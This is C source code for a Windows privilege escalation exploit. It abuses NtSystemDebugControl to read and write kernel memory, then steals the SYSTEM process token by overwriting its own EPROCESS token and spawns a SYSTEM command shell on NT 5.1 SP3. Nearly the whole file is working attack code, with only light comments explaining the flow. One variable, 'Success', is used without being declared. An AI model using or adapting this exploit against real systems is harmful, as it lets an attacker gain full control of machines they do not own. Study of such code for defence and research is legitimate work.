/*
 * An exploit to escalate to SYSTEM from SeDebugPrivilege.
  
 * The main idea is to exploit the NtSystemDebugControl() call to perform 
   reads/writes into the kernel land.
  
 * Exploitation flow:
   + Obtain KD version information via SysDbgQueryVersion.
     This contains a pointer to DebuggerDataList.
   + Obtain KD Debugger Data.
     This contains a pointer to PsActiveProcessHead.
   + Walk the active processes list and find the process with PID 4.
   + Grab the token (which would be SYSTEM).
   + Overwrite the current process' token, thus gaining SYSTEM privileges.
   + Spawn CMD shell.
   
 * NOTES:
   + Currently tested on NT 5.1 SP3 only. Should work on prior ones.
 */

#include <Windows.h>
#include <stddef.h>

#pragma comment(linker, "/entry:__mainCRTStartup")
#pragma comment(linker, "/subsystem:console")
#pragma comment(lib, "kernel32")
#pragma comment(lib, "advapi32")

typedef int (__cdecl *pvsprintf)(char *buffer, const char *format, va_list argptr); 
pvsprintf vsprintf; 

static void __puts(const char *text)
{
    DWORD charsWritten;
    WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), text, strlen(text), &charsWritten, NULL);
}

static int __printf(const char *fmt, ...)
{
    char buffer[1024];
    int length;
    DWORD charsWritten;
    va_list args;

    va_start(args, fmt);
    length = vsprintf(buffer, fmt, args);
    WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), buffer, length, &charsWritten, NULL);
    va_end(args);
    return length;
}


/* references:
 * public/sdk/inc/ntexapi.h (WRK version 1.2)
 * Memory dumping with NtSystemDebugControl
   http://ntsecurity.nu/onmymind/2007/2007-02-04.html
 * http://downloads.securityfocus.com/vulnerabilities/exploits/48179-poc.c
 */

/* 
 * Note: ALL of these require SeDebugPrivilege.
 * Note: On e.g. Windows 7, this *requires* KD to be enabled.
 * Note: some of the commands may not be implemented.
 */
typedef enum _SYSDBG_COMMAND {
    SysDbgQueryModuleInformation,
    SysDbgQueryTraceInformation, /* 5.1.SP3 */
    SysDbgSetTracepoint, /* 5.1.SP3 */
    SysDbgSetSpecialCall, /* 5.1.SP3 */
    SysDbgClearSpecialCalls, /* 5.1.SP3 */
    SysDbgQuerySpecialCalls, /* 5.1.SP3 */
    SysDbgBreakPoint, /* 5.1.SP3 */
    SysDbgQueryVersion, /* 5.1.SP3 */
    SysDbgReadVirtual, /* 5.1.SP3 */
    SysDbgWriteVirtual, /* 5.1.SP3 */
    SysDbgReadPhysical, /* 5.1.SP3 */
    SysDbgWritePhysical, /* 5.1.SP3 */
    SysDbgReadControlSpace, /* 5.1.SP3 */
    SysDbgWriteControlSpace, /* 5.1.SP3 */
    SysDbgReadIoSpace, /* 5.1.SP3 */
    SysDbgWriteIoSpace, /* 5.1.SP3 */
    SysDbgReadMsr, /* 5.1.SP3 */
    SysDbgWriteMsr, /* 5.1.SP3 */
    SysDbgReadBusData, /* 5.1.SP3 */
    SysDbgWriteBusData, /* 5.1.SP3 */
    SysDbgCheckLowMemory, /* 5.1.SP3 */

    SysDbgEnableKernelDebugger,
    SysDbgDisableKernelDebugger,
    SysDbgGetAutoKdEnable,
    SysDbgSetAutoKdEnable,
    SysDbgGetPrintBufferSize,
    SysDbgSetPrintBufferSize,
    SysDbgGetKdUmExceptionEnable,
    SysDbgSetKdUmExceptionEnable,
    SysDbgGetTriageDump,
    SysDbgGetKdBlockEnable,
    SysDbgSetKdBlockEnable,
} SYSDBG_COMMAND, *PSYSDBG_COMMAND;

/* SysDbgQueryVersion */
typedef struct _DBGKD_GET_VERSION64 {
    WORD MajorVersion;
    WORD MinorVersion;
    WORD ProtocolVersion;
    WORD Flags;
    WORD MachineType;
    BYTE MaxPacketType;
    BYTE MaxStateChange;
    BYTE MaxManipulate;
    BYTE Simulation;
    WORD Unused[1];
    ULONG64 KernBase;
    ULONG64 PsLoadedModuleList;
    ULONG64 DebuggerDataList;
} DBGKD_GET_VERSION64, *PDBGKD_GET_VERSION64;

/* SysDbgReadVirtual, SysDbgWriteVirtual */
typedef struct _SYSDBG_VIRTUAL {
    PVOID Address;
    PVOID Buffer;
    ULONG Request;
} SYSDBG_VIRTUAL, *PSYSDBG_VIRTUAL;

#if 0
/* SysDbgReadPhysical, SysDbgWritePhysical */
typedef struct _SYSDBG_PHYSICAL {
    PHYSICAL_ADDRESS Address;
    PVOID Buffer;
    ULONG Request;
} SYSDBG_PHYSICAL, *PSYSDBG_PHYSICAL;

/* SysDbgReadControlSpace, SysDbgWriteControlSpace */
typedef struct _SYSDBG_CONTROL_SPACE {
    ULONG64 Address;
    PVOID Buffer;
    ULONG Request;
    ULONG Processor;
} SYSDBG_CONTROL_SPACE, *PSYSDBG_CONTROL_SPACE;

/* SysDbgReadIoSpace, SysDbgWriteIoSpace */
typedef struct _SYSDBG_IO_SPACE {
    ULONG64 Address;
    PVOID Buffer;
    ULONG Request;
    INTERFACE_TYPE InterfaceType;
    ULONG BusNumber;
    ULONG AddressSpace;
} SYSDBG_IO_SPACE, *PSYSDBG_IO_SPACE;

/* SysDbgReadMsr, SysDbgWriteMsr */
typedef struct _SYSDBG_MSR {
    ULONG Msr;
    ULONG64 Data;
} SYSDBG_MSR, *PSYSDBG_MSR;

/* SysDbgReadBusData, SysDbgWriteBusData */
typedef struct _SYSDBG_BUS_DATA {
    ULONG Address;
    PVOID Buffer;
    ULONG Request;
    BUS_DATA_TYPE BusDataType;
    ULONG BusNumber;
    ULONG SlotNumber;
} SYSDBG_BUS_DATA, *PSYSDBG_BUS_DATA;
#endif

typedef NTSYSAPI NTSTATUS (NTAPI *PNTSYSTEMDEBUGCONTROL)(
    SYSDBG_COMMAND Command,
    PVOID InputBuffer,
    ULONG InputBufferLength,
    PVOID OutputBuffer,
    ULONG OutputBufferLength,
    PULONG ReturnLength);
PNTSYSTEMDEBUGCONTROL NtSystemDebugControl;


/* Obtain KD version block. */
static NTSTATUS QueryVersion(PDBGKD_GET_VERSION64 VersionInfo)
{
    ULONG ReturnLength;
    return NtSystemDebugControl(SysDbgQueryVersion, NULL, 0, VersionInfo, sizeof(*VersionInfo), &ReturnLength);
}

/* Read arbitrary memory from the current process' memory space.
 * Args:
 * VirtualAddress -- Page-aligned address where to start reading
 * Buffer -- Where to write
 * Size -- Amount to read, bytes
 */
static NTSTATUS ReadKernelMemory(PVOID VirtualAddress, PVOID Buffer, ULONG Size)
{
    SYSDBG_VIRTUAL Params = { VirtualAddress, Buffer, Size };
    ULONG ReturnLength;
    
    return NtSystemDebugControl(SysDbgReadVirtual, &Params, sizeof(Params), NULL, 0, &ReturnLength);
}

/* Write arbitrary memory from the current process' memory space.
 * Args:
 * VirtualAddress -- Page-aligned address where to start writing
 * Buffer -- Where to read from
 * Size -- Amount to write, bytes
 */
static NTSTATUS WriteKernelMemory(PVOID VirtualAddress, PVOID Buffer, ULONG Size)
{
    SYSDBG_VIRTUAL Params = { VirtualAddress, Buffer, Size };
    ULONG ReturnLength;
    
    return NtSystemDebugControl(SysDbgWriteVirtual, &Params, sizeof(Params), NULL, 0, &ReturnLength);
}


/* Grab the SeDebugPrivilege. */
static int CheckForSeDebugPrivilege(void)
{
    LUID luidDebugPrivilege;
    HANDLE hToken;
    TOKEN_PRIVILEGES newState;

    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, TRUE, &hToken)) 
    {
        if (GetLastError() != ERROR_NO_TOKEN)
        {
            __puts("\n[-] Failed to grab thread token (for whatever reason).\n\n");
            return 0;
        }

        // Retry against process token if no thread token exists.
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken))
        {
            __puts("\n[-] Failed to grab process token (for whatever reason).\n\n");
            return 0;
        }
    }

    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luidDebugPrivilege))
    {
        __puts("\n[-] Failed to find SeDebugPrivilege LUID (for whatever reason).\n\n");
        return 0;
    }

    newState.PrivilegeCount = 1;
    newState.Privileges[0].Luid = luidDebugPrivilege;
    newState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (AdjustTokenPrivileges(hToken, FALSE, &newState, sizeof(newState), NULL, 0))
    {
        if(GetLastError() == ERROR_NOT_ALL_ASSIGNED)
        {
            __puts("\n[-] Failed to set SeDebugPrivilege (for whatever reason).\n\n");
            return 0;
        }
        __puts("\n[+] SeDebugPrivilege granted.");
        return 1;
    }
    __puts("\n[-] Failed to set AdjustTokenPrivileges (for whatever reason).\n\n");
    return 0;
}


static void GrabNtdllRoutines(void)
{
    HMODULE hNtdll;

    hNtdll = GetModuleHandleA("ntdll.dll");
    vsprintf = (pvsprintf)GetProcAddress(hNtdll, "vsprintf");
    NtSystemDebugControl = (PNTSYSTEMDEBUGCONTROL)GetProcAddress(hNtdll, "NtSystemDebugControl");
}

/* From wdbgexts.h */

typedef struct _DBGKD_DEBUG_DATA_HEADER64 {
    LIST_ENTRY64 List;
    ULONG OwnerTag;
    ULONG Size;
} DBGKD_DEBUG_DATA_HEADER64, *PDBGKD_DEBUG_DATA_HEADER64;

typedef struct _KDDEBUGGER_DATA64 {
    DBGKD_DEBUG_DATA_HEADER64 Header;
    ULONG64 KernBase;
    ULONG64 BreakpointWithStatus;
    ULONG64 SavedContext;
    USHORT ThCallbackStack;
    USHORT NextCallback;
    USHORT FramePointer;
    USHORT PaeEnabled:1;
    ULONG64 KiCallUserMode;
    ULONG64 KeUserCallbackDispatcher;
    ULONG64 PsLoadedModuleList;
    ULONG64 PsActiveProcessHead;
    ULONG64 PspCidTable;
    ULONG64 ExpSystemResourcesList;
    ULONG64 ExpPagedPoolDescriptor;
    ULONG64 ExpNumberOfPagedPools;
    ULONG64 KeTimeIncrement;
    ULONG64 KeBugCheckCallbackListHead;
    ULONG64 KiBugcheckData;
    ULONG64 IopErrorLogListHead;
    ULONG64 ObpRootDirectoryObject;
    ULONG64 ObpTypeObjectType;
    ULONG64 MmSystemCacheStart;
    ULONG64 MmSystemCacheEnd;
    ULONG64 MmSystemCacheWs;
    ULONG64 MmPfnDatabase;
    ULONG64 MmSystemPtesStart;
    ULONG64 MmSystemPtesEnd;
    ULONG64 MmSubsectionBase;
    ULONG64 MmNumberOfPagingFiles;
    ULONG64 MmLowestPhysicalPage;
    ULONG64 MmHighestPhysicalPage;
    ULONG64 MmNumberOfPhysicalPages;
    ULONG64 MmMaximumNonPagedPoolInBytes;
    ULONG64 MmNonPagedSystemStart;
    ULONG64 MmNonPagedPoolStart;
    ULONG64 MmNonPagedPoolEnd;
    ULONG64 MmPagedPoolStart;
    ULONG64 MmPagedPoolEnd;
    ULONG64 MmPagedPoolInformation;
    ULONG64 MmPageSize;
    ULONG64 MmSizeOfPagedPoolInBytes;
    ULONG64 MmTotalCommitLimit;
    ULONG64 MmTotalCommittedPages;
    ULONG64 MmSharedCommit;
    ULONG64 MmDriverCommit;
    ULONG64 MmProcessCommit;
    ULONG64 MmPagedPoolCommit;
    ULONG64 MmExtendedCommit;
    ULONG64 MmZeroedPageListHead;
    ULONG64 MmFreePageListHead;
    ULONG64 MmStandbyPageListHead;
    ULONG64 MmModifiedPageListHead;
    ULONG64 MmModifiedNoWritePageListHead;
    ULONG64 MmAvailablePages;
    ULONG64 MmResidentAvailablePages;
    ULONG64 PoolTrackTable;
    ULONG64 NonPagedPoolDescriptor;
    ULONG64 MmHighestUserAddress;
    ULONG64 MmSystemRangeStart;
    ULONG64 MmUserProbeAddress;
    ULONG64 KdPrintCircularBuffer;
    ULONG64 KdPrintCircularBufferEnd;
    ULONG64 KdPrintWritePointer;
    ULONG64 KdPrintRolloverCount;
    ULONG64 MmLoadedUserImageList;
    // NT 5.1 Addition
    ULONG64 NtBuildLab;
    ULONG64 KiNormalSystemCall;
    // NT 5.0 hotfix addition
    ULONG64 KiProcessorBlock;
    ULONG64 MmUnloadedDrivers;
    ULONG64 MmLastUnloadedDriver;
    ULONG64 MmTriageActionTaken;
    ULONG64 MmSpecialPoolTag;
    ULONG64 KernelVerifier;
    ULONG64 MmVerifierData;
    ULONG64 MmAllocatedNonPagedPool;
    ULONG64 MmPeakCommitment;
    ULONG64 MmTotalCommitLimitMaximum;
    ULONG64 CmNtCSDVersion;
    // NT 5.1 Addition
    ULONG64 MmPhysicalMemoryBlock;
    ULONG64 MmSessionBase;
    ULONG64 MmSessionSize;
    ULONG64 MmSystemParentTablePage;
#if 0
    // Server 2003 addition
    ULONG64 MmVirtualTranslationBase;
    USHORT OffsetKThreadNextProcessor;
    USHORT OffsetKThreadTeb;
    USHORT OffsetKThreadKernelStack;
    USHORT OffsetKThreadInitialStack;
    USHORT OffsetKThreadApcProcess;
    USHORT OffsetKThreadState;
    USHORT OffsetKThreadBStore;
    USHORT OffsetKThreadBStoreLimit;
    USHORT SizeEProcess;
    USHORT OffsetEprocessPeb;
    USHORT OffsetEprocessParentCID;
    USHORT OffsetEprocessDirectoryTableBase;
    USHORT SizePrcb;
    USHORT OffsetPrcbDpcRoutine;
    USHORT OffsetPrcbCurrentThread;
    USHORT OffsetPrcbMhz;
    USHORT OffsetPrcbCpuType;
    USHORT OffsetPrcbVendorString;
    USHORT OffsetPrcbProcStateContext;
    USHORT OffsetPrcbNumber;
    USHORT SizeEThread;
    ULONG64 KdPrintCircularBufferPtr;
    ULONG64 KdPrintBufferSize;
    ULONG64 KeLoaderBlock;
    USHORT SizePcr;
    USHORT OffsetPcrSelfPcr;
    USHORT OffsetPcrCurrentPrcb;
    USHORT OffsetPcrContainedPrcb;
    USHORT OffsetPcrInitialBStore;
    USHORT OffsetPcrBStoreLimit;
    USHORT OffsetPcrInitialStack;
    USHORT OffsetPcrStackLimit;
    USHORT OffsetPrcbPcrPage;
    USHORT OffsetPrcbProcStateSpecialReg;
    USHORT GdtR0Code;
    USHORT GdtR0Data;
    USHORT GdtR0Pcr;
    USHORT GdtR3Code;
    USHORT GdtR3Data;
    USHORT GdtR3Teb;
    USHORT GdtLdt;
    USHORT GdtTss;
    USHORT Gdt64R3CmCode;
    USHORT Gdt64R3CmTeb;
    ULONG64 IopNumTriageDumpDataBlocks;
    ULONG64 IopTriageDumpDataBlocks;
    // Longhorn addition
    ULONG64 VfCrashDataBlock;
    ULONG64 MmBadPagesDetected;
    ULONG64 MmZeroedPageSingleBitErrorsDetected;
    // Windows 7 addition
    ULONG64 EtwpDebuggerData;
    USHORT OffsetPrcbContext;
#endif
} KDDEBUGGER_DATA64, *PKDDEBUGGER_DATA64;

/* TODO: cover other NTOS versions. */
typedef struct {
    UCHAR meh1[0x84];
    UINT UniqueProcessId;
    LIST_ENTRY ActiveProcessLinks;
    UCHAR meh2[0x38];
    PVOID Token;
} EPROCESS_NT51_SP3;


static int SpawnCmd(void)
{
	STARTUPINFOA StartInfo;
	PROCESS_INFORMATION ProcInfo;
    char ComSpec[128];
    BOOL Success;

    if (GetEnvironmentVariableA("ComSpec", ComSpec, sizeof(ComSpec)) == 0) {
        return FALSE;
    }

    memset(&StartInfo, 0, sizeof(StartInfo));
    StartInfo.cb = sizeof(StartInfo);
	Success = CreateProcessA(
		NULL,
		ComSpec,
		NULL,
		NULL,
		TRUE,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&StartInfo,
		&ProcInfo);
    return Success;
}


void __mainCRTStartup(void)
{
    NTSTATUS Status;
    DWORD CurrentPid;
    DBGKD_GET_VERSION64 KdVersionInfo;
    LIST_ENTRY KdpDebuggerDataListHead;
    KDDEBUGGER_DATA64 KdData;
    LIST_ENTRY PsActiveProcessHead;
    PVOID ProcessListPtr;
    EPROCESS_NT51_SP3 Process;
    PVOID SystemToken = NULL;
    PVOID MyProcess = NULL;
    PVOID MyToken;

    /* Currently, 5.1 SP3 only... */
    __puts("\nSeDebugPrivilege SYSTEM exploit for NT kernels prior to 6.0.\n");

    GrabNtdllRoutines();

    if (!CheckForSeDebugPrivilege()) {
        return;
    }

    __puts("\n[.] Grabbing KD version info.");
    Status = QueryVersion(&KdVersionInfo);
    if (Status) {
        __puts("\n[-] Failed to query KD version block.\n");
        return;
    }
    __puts("\n[.] Grabbing KdpDebuggerDataListHead.");
    Status = ReadKernelMemory((PVOID)KdVersionInfo.DebuggerDataList, &KdpDebuggerDataListHead, sizeof(KdpDebuggerDataListHead));
    if (Status) {
        __puts("\n[-] Failed to retrieve KD data list head.\n");
        return;
    }
    __puts("\n[.] Grabbing KD Debugger Data.");
    Status = ReadKernelMemory(KdpDebuggerDataListHead.Flink, &KdData, sizeof(KdData));
    if (Status) {
        __puts("\n[-] Failed to retrieve KD data block.\n");
        return;
    }
    __puts("\n[.] Grabbing PsActiveProcessHead.");
    Status = ReadKernelMemory((PVOID)KdData.PsActiveProcessHead, &PsActiveProcessHead, sizeof(PsActiveProcessHead));
    if (Status) {
        __puts("\n[-] Failed to retrieve PsActiveProcessHead.\n");
        return;
    }

    CurrentPid = GetCurrentProcessId();

    __puts("\n[.] Walking active process list.");
    ProcessListPtr = PsActiveProcessHead.Flink;
    do {
        PVOID ProcessPtr;

        ProcessPtr = (PVOID)((UINT_PTR)ProcessListPtr - offsetof(EPROCESS_NT51_SP3, ActiveProcessLinks));
        Status = ReadKernelMemory(ProcessPtr, &Process, sizeof(Process));
        if (Status) {
            __printf("\n[-] Failed to retrieve EPROCESS struct at %p.\n", ProcessPtr);
            return;
        }
        if (Process.UniqueProcessId == 4) {
            SystemToken = Process.Token;
            __printf("\n[+] SYSTEM token found: %p", SystemToken);
        }
        else if (Process.UniqueProcessId == CurrentPid) {
            MyProcess = ProcessPtr;
            MyToken = Process.Token;
        }
        ProcessListPtr = Process.ActiveProcessLinks.Flink;
    } while (ProcessListPtr != (PVOID)KdData.PsActiveProcessHead);

    if (!SystemToken) {
        __puts("\n[-] Failed to locate SYSTEM token.\n\n");
        return;
    }
    if (!MyProcess) {
        __puts("\n[-] Failed to locate my EPROCESS object.\n\n");
        return;
    }

    __puts("\n[!] Overwriting token.");
    Status = WriteKernelMemory(
        (PVOID)((UINT_PTR)MyProcess + offsetof(EPROCESS_NT51_SP3, Token)),
        &SystemToken,
        sizeof(SystemToken));
    if (Status) {
        __puts("\n[-] Failed to overwrite the token.\n\n");
        return;
    }

    __puts("\n[.] Spawning the CMD shell.");
    Success = SpawnCmd();
    if (!Success) {
        __puts("\n[-] Failed to spawn the shell.\n\n");
        return;
    }

    __puts("\n[.] Restoring token.");
    Status = WriteKernelMemory(
        (PVOID)((UINT_PTR)MyProcess + offsetof(EPROCESS_NT51_SP3, Token)),
        &MyToken,
        sizeof(MyToken));
	__puts("\n[+] XOXO, dev_zzo.\n");
}
